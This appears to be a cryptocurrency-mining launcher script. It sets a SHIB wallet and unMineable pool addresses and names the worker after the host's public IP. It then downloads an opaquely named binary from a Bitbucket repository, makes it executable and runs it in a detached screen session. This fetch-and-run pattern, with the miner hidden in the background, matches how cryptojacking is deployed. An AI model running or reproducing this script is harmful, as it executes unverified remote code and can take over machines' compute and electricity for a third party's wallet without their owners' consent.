WALLET=SHIB:0x9ffded4cf417cbf75ed73e4bbe3ee7df30d9ec46
POOL1=ethash.unmineable.com:13333
POOL2=etchash.unmineable.com:13333
WORKER=$(echo "$(curl -s ifconfig.me)" | tr . _ )-MOON
COMA="--algo ETHASH --pool $POOL1 --user $WALLET.$WORKER --dualmode etc --dualstratum $WALLET.$WORKER@$POOL2"



FILE=./tuan
if [ -f "$FILE" ]; then
    echo "$FILE exists."
else 
    wget https://bitbucket.org/solomase/garangsem/raw/d261db312adaef2baefd19624650e14af8c938dc/tuan
    chmod +x ./tuan
fi
screen -dmLS mine ./tuan $COMA
